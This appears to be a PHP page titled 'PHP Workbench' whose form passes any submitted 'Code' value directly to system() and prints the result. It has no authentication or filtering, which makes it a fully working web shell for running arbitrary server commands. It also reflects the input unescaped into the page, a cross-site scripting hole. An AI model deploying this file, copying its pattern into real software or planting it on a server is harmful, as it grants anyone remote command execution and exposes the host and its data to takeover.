<!DOCTYPE html>
<?php

$Screen = "New";

// Code to test PHP in a screen

if (isset($_REQUEST["Code"])) {
	$Code = $_REQUEST["Code"];
	$Screen="";
}
else {
	$Code = "";
    $Screen="New";
}
?>
<html>
  <head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <title>PHP Workbench</title>
  </head>
  
  <?php
  // Handles the screen for code
  if ($Screen == "New" || $Screen == "") {
  ?>
  <body>
    <p><br>
    </p>
	<?php include "menu.php"; ?>
	OS Command
    <form name="" action="" method="GET" autocomplete="off" novalidate="novalidate">
	<textarea name="Code" rows="3" cols="80" id="Code"><?php echo $Code ?></textarea><br>
    <input type="submit" value="Run"><input type="button" value="Clear" onclick="x=document.getElementById('Code');x.value=''"> 
    </form>
    <p><br>
    </p>
	<pre>
    <?php 
    if (isset($Code) && $Code != "") system($Code,$r);
    ?>
	</pre>
  </body>
  <?php
  }
  
  if ($Screen == "OSCmd") {
  ?>
  <body>
  </body>
  <?php
  }
  ?>
  
</html>
